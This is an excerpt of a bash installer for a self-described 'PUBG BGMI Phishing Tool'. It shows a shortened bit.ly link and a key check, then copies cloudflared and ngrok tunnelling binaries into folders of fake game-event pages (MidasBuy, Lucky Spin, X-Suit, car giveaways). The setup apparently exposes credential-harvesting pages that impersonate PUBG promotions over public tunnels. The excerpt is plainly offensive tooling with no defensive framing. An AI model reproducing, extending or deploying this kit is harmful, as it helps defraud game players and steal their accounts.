...
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/PUBG-BGMI  "
echo ""
echo ""
...
echo""
echo""
if [[ $option == *'abcdef12b478c48267755a4b69d65a'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
...
echo ""
echo
cp -R cloudflared-linux-arm ngrok SUMAN/X-Suit/
cp -R cloudflared-linux-arm ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
cp -R cloudflared-linux-arm ngrok SUMAN/MidasBuy/
cp -R cloudflared-linux-arm ngrok SUMAN/RP-Month-6-event/
cp -R cloudflared-linux-arm ngrok SUMAN/Collect-Car-event/
cp -R cloudflared-linux-arm ngrok SUMAN1/Collect-MC-Larent-Car/
cp -R cloudflared-linux-arm ngrok SUMAN1/SPIN-EVENT/
cp -R cloudflared-linux-arm ngrok SUMAN1/Collect-EVENT-LINE/
cp -R cloudflared-linux-arm ngrok SUMAN1/Lucky-Spin-Godzila-S19/
cp -R cloudflared-linux-arm ngrok SUMAN1/Godzilla-LuckySpin/
